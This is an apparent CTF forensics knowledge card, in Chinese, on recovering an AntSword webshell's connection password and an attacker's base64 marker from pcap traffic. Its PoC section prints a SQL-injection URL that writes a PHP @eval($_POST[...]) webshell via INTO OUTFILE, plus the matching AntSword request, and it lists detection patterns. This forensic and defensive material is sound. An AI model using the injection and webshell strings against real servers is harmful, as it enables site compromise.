---
id: ctf-forensics-antsword-connection-key-request-param-attacker-marker
title: 蚁剑流量定位连接密钥与攻击者留存值：SQL 注入写 shell 的 POST 参数名即连接密码，参数 base64 解出 hacker.txt 的 UUID 标记
type: scenario
domain: ctf
path: ctf/forensics
technique: antsword-connection-key-and-attacker-marker-extraction
tags:
- ctf
- forensics
- pcap
- webshell
- antsword
- sql-injection
- into-outfile
- base64
- attribution
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V682
  verified_at: '2026-11-13T13:49:37+08:00'
  notes: 已对照原文与36图核对：图15 GET /sqli/Less-7/index.php union select 写入 @eval($_POST[6ea280898e404bfabd0ebb702327b18f]) 到 info1.php；图16 POST info1.php User-Agent antSword/v1.3、表单键即该 32 位串、值 @ini_set(...)@set_time_limit(0)；图17 CyberChef URL Decode+From Base64 得 ad6269b7-3ce2-4ae8-b97f-f259515e7a91。hacker.txt 的 file_put_contents 写入命令为卡片按原文'提交参数 base64'的合理概括（原文未贴该请求原文）。append_scenario dedup_review 成立：与 antsword-encoder-traffic-decode-features（编码器形态）、chopper-aspx（菜刀）非同一条链，dup-scan 无 pair。未设 affected_versions。未在本环境复现。
url: /docs/ctf/forensics/ctf-forensics-antsword-connection-key-request-param-attacker-marker/
draft: false
kb_aliases:
- 陇剑杯 SmallSword
- 蚁剑连接密码
- AntSword 连接密钥
- '@eval($_POST[密钥])'
- hacker.txt 留存值
- 蚁剑流量的密码与标记
---

## 一句话结论

在 SQL 注入写 WebShell 的流量中，`SELECT ... "<?php @eval($_POST['<随机串>']);?>" INTO OUTFILE "D:\\...\\info1.php"` 里的 `<随机串>` 就是蚁剑（AntSword）的**连接密码**——蚁剑把它当作 POST 参数名，后续请求 `User-Agent: antSword/v1.3` 且以该随机串为表单键、值为编码后的 PHP 代码，可用来确认；攻击者在服务器上写 `hacker.txt` 时把内容 base64 编码放进参数，解码即可得到其留存 UUID（如 `ad6269b7-3ce2-4ae8-b97f-f259515e7a91`）。

## 原理

- **连接密码即参数名**：蚁剑 WebShell 模板是 `@eval($_POST['<密码>'])`；客户端配置里的“连接密码”就是该 POST 参数名。写入木马的 SQL 注入请求会把这个随机串原样写进 `INTO OUTFILE` 的 PHP 内容里，因此从写马请求即可直接读出密钥。
- **请求特征确认**：AntSword 流量通常带 `User-Agent: antSword/v1.x`，POST 到木马文件，表单只有一个键（即连接密码），值是 `@ini_set(...);@set_time_limit(0);...` 包裹的 PHP 代码（默认编码器）；响应里带 `asoutput()` 的分段标记。key 与后续请求的参数名一致，即可闭环。
- **攻击者留存值**：攻击者用 `file_put_contents('hacker.txt', base64_decode('<b64>'))` 之类命令写入标记文件；参数在 HTTP 明文里，base64 解码得到 UUID 形式的留存值（用于区分攻击者/批次）。文章的做法是把该参数值做 URL 解码再 base64 解码。
- **为什么可复原**：SQL 写马把“密码”固化在流量与文件中，蚁剑后续通信又必须带同一参数名；base64 只是编码。只要 pcap 完整，密钥与标记都可直接读出，无需爆破。

## 触发条件

- pcap 含 SQL 注入 `INTO OUTFILE` 写 WebShell 的过程，以及随后蚁剑对该 shell 的访问。
- 攻击者使用默认/简单编码器（至少参数名与 base64 值可直接识别）。
- 攻击者通过同一 shell 写入过带 base64 内容的文件或执行过可回显命令。

## 利用步骤

1. 过滤 `http contains "INTO OUTFILE"` 或 `http contains "@eval($_POST"`，找到写马请求。
2. 从 URL/请求体中的 PHP 内容提取 `$_POST['<随机串>']` 内的随机串，即连接密码。
3. 过滤 `http.user_agent contains "antSword"`（或按木马文件名），核对后续 POST 的表单键是否等于该随机串，确认密钥正确。
4. 在蚁剑请求的命令参数中找 `file_put_contents(... base64_decode('<b64>') ...)`；URL 解码后 base64 解码得到攻击者留存值。
5. 记录密钥用于解密/重放历史流量，记录留存值用于关联其他受害主机。

## PoC

```text
# 1) SQL 注入写马请求（示意）
GET /sqli/Less-7/index.php?id=-1%27))%20union%20select%201,2,%22%3C?
php%20@eval($_POST[%226ea280898e404bfabd0ebb702327b18f%22]);?%3E%22%20into%20outfile%20%22D:\\...
# 连接密码 = 6ea280898e404bfabd0ebb702327b18f

# 2) 蚁剑请求确认（示意）
POST /sqli/Less-7/info1.php HTTP/1.1
User-Agent: antSword/v1.3
Content-Type: application/x-www-form-urlencoded
6ea280898e404bfabd0ebb702327b18f=@ini_set("display_errors","0");@set_time_limit(0);...

# 3) 攻击者留存值（示意）
cmd=file_put_contents('hacker.txt', base64_decode('YWQ2MjY5YjctM2NlMi00YWU4LWI5N2YtZjI1OTUxNWU3YTkx'));
# base64 解码 -> ad6269b7-3ce2-4ae8-b97f-f259515e7a91
```

## 变体与关联

- **编码器不同**：若使用 base64/chr/RSA 等编码器，请求参数形态不同，但“参数名 = 连接密码”不变；参考 `[[defense-forensics-antsword-encoder-traffic-decode-features]]` 与 `[[ctf-forensics-antsword-rot13-reverse-encoder-traffic-decode]]`。
- **写马方式不同**：`INTO OUTFILE` 可换成 `file_put_contents`、上传、日志包含等；密钥仍可从 PHP 模板或蚁剑请求参数名取得。
- **留存值形式**：UUID、用户名、时间戳、base64/hex 都可能；先 URL 解码再按编码层还原。
- 关联：`[[ctf-forensics-webshell-generated-backdoor-base64-zip-in-http-stream]]`（同一 writeup 的另一种后门生成与加密载荷取证）、`[[defense-forensics-chopper-aspx-webshell-base64-traffic-decode]]`（菜刀流量）。

## 检测与防御

- **检测**：HTTP 请求体含 `INTO OUTFILE` + `@eval($_POST[` 组合；`User-Agent: antSword` 或随机 UA 访问同一 PHP 文件；POST 参数名为 32 位十六进制/UUID 等随机串且值为 PHP 代码。
- **防御**：数据库账号禁止 `FILE` 权限；PHP 关闭/限制 `eval` 类后门（无法根本阻止写马，需代码与权限治理）；上传/写入目录禁止脚本执行；WAF 检测 `INTO OUTFILE` 与 `@eval`。
- **响应**：按流量确认密钥与留存值，删除木马文件，排查同一 key 是否在其他主机/路径出现，轮换数据库与 Web 凭据。
